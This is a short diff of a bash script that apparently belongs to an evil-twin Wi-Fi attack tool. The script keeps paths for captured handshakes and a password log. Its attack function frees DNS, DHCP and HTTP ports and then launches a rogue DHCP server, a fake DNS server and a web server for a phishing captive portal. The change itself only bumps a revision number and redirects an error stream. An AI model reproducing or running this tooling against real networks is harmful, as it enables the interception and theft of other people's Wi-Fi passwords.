@@ -36,7 +36,7 @@ HANDSHAKE_PATH="/root/handshakes"
 PASSLOG_PATH="/root/pwlog"
 WORK_DIR=`pwd`
 DEAUTHTIME="10"
-revision=10
+revision=11
 version=2
 IP=192.168.1.1
 RANG_IP=$(echo $IP | cut -d "." -f 1,2,3)
@@ -2104,7 +2104,7 @@ function attack {
         fuser -n tcp -k 53 67 80 &> $flux_output_device
         fuser -n udp -k 53 67 80 &> $flux_output_device
 
-        xterm -bg black -fg green $TOPLEFT -T DHCP -e "dhcpd -d -f -lf "$DUMP_PATH/dhcpd.leases" -cf "$DUMP_PATH/dhcpd.conf" $interfaceroutear 2>> $WORK_DIR/log | tee -a $DUMP_PATH/clientes.txt" &
+        xterm -bg black -fg green $TOPLEFT -T DHCP -e "dhcpd -d -f -lf "$DUMP_PATH/dhcpd.leases" -cf "$DUMP_PATH/dhcpd.conf" $interfaceroutear 2>&1 | tee -a $DUMP_PATH/clientes.txt" &
         xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "FAKEDNS" -e "if type python2 2>> $WORK_DIR/log; then python2 $DUMP_PATH/fakedns; else python $DUMP_PATH/fakedns; fi" &
 
         lighttpd -f $DUMP_PATH/lighttpd.conf &> $flux_output_device
